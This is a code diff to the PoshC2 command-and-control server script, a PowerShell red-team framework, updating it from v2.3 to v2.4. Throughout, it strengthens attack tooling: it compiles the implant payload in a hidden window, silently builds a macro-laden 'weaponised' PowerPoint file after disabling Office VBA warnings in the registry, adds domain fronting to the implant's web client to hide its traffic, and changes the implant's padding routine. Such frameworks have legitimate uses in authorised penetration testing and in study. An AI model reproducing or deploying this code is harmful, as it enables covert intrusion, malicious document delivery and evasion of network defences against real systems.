@@ -18,7 +18,7 @@ Write-Host -Object " |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ "  -Fore
 Write-Host -Object " |    |  (  <_> )___ \|   Y  \ \     \____/       \ "  -ForegroundColor Green
 Write-Host -Object " |____|   \____/____  >___|  /  \______  /\_______ \"  -ForegroundColor Green
 Write-Host -Object "                    \/     \/          \/         \/"  -ForegroundColor Green
-Write-Host "=============== v2.3 www.PoshC2.co.uk ==============" -ForegroundColor Green
+Write-Host "=============== v2.4 www.PoshC2.co.uk ==============" -ForegroundColor Green
 Write-Host "====================================================" `n -ForegroundColor Green
 
 if (!$RestartC2Server) {
@@ -352,10 +352,10 @@ public class Sample : System.Configuration.Install.Installer
 [IO.File]::WriteAllLines("$global:newdir\payloads\posh.cs", $csccode)
 
 if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
-    Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
+    Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
 } else {
     if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
-        Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
+        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
     }
 }
 
@@ -481,7 +481,7 @@ UpdateMacro'
     Add-Type -AssemblyName Microsoft.Office.Interop.Powerpoint
     $PPTApp = New-Object -ComObject "Powerpoint.Application"
     $PPTVersion = $PPTApp.Version
-    $PPTApp.visible = "msoTrue"
+    $notvisible = [microsoft.office.core.msotristate]::msoFalse
 
     New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
     New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
@@ -489,13 +489,13 @@ UpdateMacro'
     $SlideType = "Microsoft.Office.Interop.Powerpoint.ppSlideLayout" -as [type]
     $BlankLayout = $SlideType::ppLayoutTitleOnly
 
-    $PPTPage = $PPTApp.Presentations.Add()
+    $PPTPage = $PPTApp.Presentations.Add([microsoft.office.core.msotristate]::msoFalse)
     $PPTVBA = $PPTPage.VBProject.VBComponents.Add(1)
     $PPTVBA.CodeModule.AddFromString($macrodoc)
     $PPTPage.SaveAs("$global:newdir\payloads\PowerpointMacro", [Microsoft.Office.Interop.Powerpoint.PpSaveAsFileType]::ppSaveAsPresentation)
     Write-Host -Object "Weaponised Microsoft Powerpoint Document written to: $global:newdir\payloads\PowerpointMacro.ppt"  -ForegroundColor Green
+    $PPTPage.Close()
     $PPTApp.Quit()
-    $PPTApp = $null
     Stop-Process -name "POWERPNT"
 
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name AccessVBOM | Out-Null
@@ -777,6 +777,7 @@ if ($RestartC2Server)
     $defaultbeacon = $c2serverresults.DefaultSleep
     $killdatefm = $c2serverresults.KillDate
     $ipv4address = $c2serverresults.HostnameIP 
+    $DomainFrontHeader = $c2serverresults.DomainFrontHeader 
     $serverport = $c2serverresults.ServerPort 
     $shortcut = $c2serverresults.QuickCommand
     $downloaduri = $c2serverresults.DownloadURI
@@ -839,17 +840,29 @@ else
         $prompt = Read-Host -Prompt "[1] Enter the IP address or Hostname of the Posh C2 server (External address if using NAT) [$($localipfull)]"
         $ipv4address = ($localipfull,$prompt)[[bool]$prompt]
     }
-
-    $prompt = Read-Host -Prompt "[2] Do you want to use HTTPS? [No]"
-    if ($prompt -eq "Yes") {
+    $prompthttpsdef = "Yes"
+    $prompthttps = Read-Host -Prompt "[2] Do you want to use HTTPS? [Yes]"
+    $prompthttps = ($prompthttpsdef,$prompthttps)[[bool]$prompthttps]
+    if ($prompthttps -eq "Yes") {
     $ipv4address = "https://"+$ipv4address
-    Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
-    https://www.microsoft.com/en-us/download/details.aspx?id=17275
-    selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443
+    $promptssldefault = "Yes"
+    $promptssl = Read-Host -Prompt "[2a] Do you want PoshC2 to create a new self-signed SSL certificate, PSv4 required? [Yes]"
+    $promptssl = ($promptssldefault,$promptssl)[[bool]$promptssl]
+    if ($promptssl -eq "Yes") {
+        $thumb = New-SelfSignedCertificate -certstorelocation cert:\localmachine\my -dnsname $ipv4address | select thumbprint -ExpandProperty thumbprint
+        $Deleted = netsh.exe http delete sslcert ipport=0.0.0.0:443
+        $Added = netsh.exe http add sslcert ipport=0.0.0.0:443 certhash=$thumb "appid={00112233-4455-6677-8899-AABBCCDDEEFF}"
+        if ($Added = "SSL Certificate successfully added") {
+            netsh.exe http show sslcert ipport=0.0.0.0:443
+        } else {
+            Write-Error "Error adding the certificate" 
+            Write-Host "`nEither install a self-signed cert using IIS Resource Kit as below
+https://www.microsoft.com/en-us/download/details.aspx?id=17275
+selfssl.exe /N:CN=HTTPS_CERT /K:1024 /V:7 /S:1 /P:443
 
-    or 
+or 
     
-    Download and convert the PEM to PFX for windows import and import to personal:
+Download and convert the PEM to PFX for windows import and import to personal:
 openssl pkcs12 -inkey privkey.pem -in cert.pem -export -out priv.pfx
 
 Grab the thumbprint:
@@ -859,6 +872,14 @@ Install using netsh:
 netsh http delete sslcert ipport=0.0.0.0:443
 netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-4455-6677-8899-AABBCCDDEEFF}`"
 "
+}
+    $promptdomfront = Read-Host -Prompt "[2b] Do you want to use domain fronting, if so specify the host header?"
+    if ($promptdomfront) {
+        $domainfrontheader = $promptdomfront
+    }
+
+    } 
+
         $defaultserverport = 443
     } else {
     $ipv4address = "http://"+$ipv4address
@@ -959,6 +980,7 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
     $Query = 'CREATE TABLE C2Server (
         ID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
         HostnameIP TEXT,
+        DomainFrontHeader TEXT,
         DefaultSleep TEXT,
         KillDate TEXT,
         HTTPResponse TEXT,
@@ -979,13 +1001,14 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
-    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds)
-            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds)'
+    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds)
+            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds)'
 
     Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
         DefaultSleep = $defaultbeacon
         KillDate = $killdatefm
         HostnameIP  = $ipv4address
+        DomainFrontHeader  = $domainfrontheader
         HTTPResponse = $httpresponse
         FolderPath = $global:newdir
         ServerPort = $serverport
@@ -1014,6 +1037,8 @@ function Get-Webclient ($Cookie) {
 $wc = New-Object System.Net.WebClient; 
 $wc.UseDefaultCredentials = $true; 
 $wc.Proxy.Credentials = $wc.Credentials;
+$h="'+$domainfrontheader+'"
+if ($h) {$wc.Headers.Add("Host",$h)}
 if ($cookie) {
 $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
 } $wc }
@@ -1225,7 +1250,6 @@ while ($listener.IsListening)
             Sleep = $defaultbeacon
             ModsLoaded = ""
         }
-
         $message = '
 
 $key="' + "$key"+'"
@@ -1241,7 +1265,7 @@ function getimgdata($cmdoutput) {
         param (
             [int]$Length
         )
-        $set    = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
+        $set = "...................@..........................Tyscf".ToCharArray()
         $result = ""
         for ($x = 0; $x -lt $Length; $x++) 
         {$result += $set | Get-Random}
@@ -1468,7 +1492,6 @@ $message =[Convert]::ToBase64String($Bytes)
             Sleep = $defaultbeacon
             ModsLoaded = ""
         }
-
         $message = '
 
 $key="' + "$key"+'"
@@ -1484,7 +1507,7 @@ function getimgdata($cmdoutput) {
         param (
             [int]$Length
         )
-        $set    = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
+        $set = "...................@..........................Tyscf".ToCharArray()
         $result = ""
         for ($x = 0; $x -lt $Length; $x++) 
         {$result += $set | Get-Random}
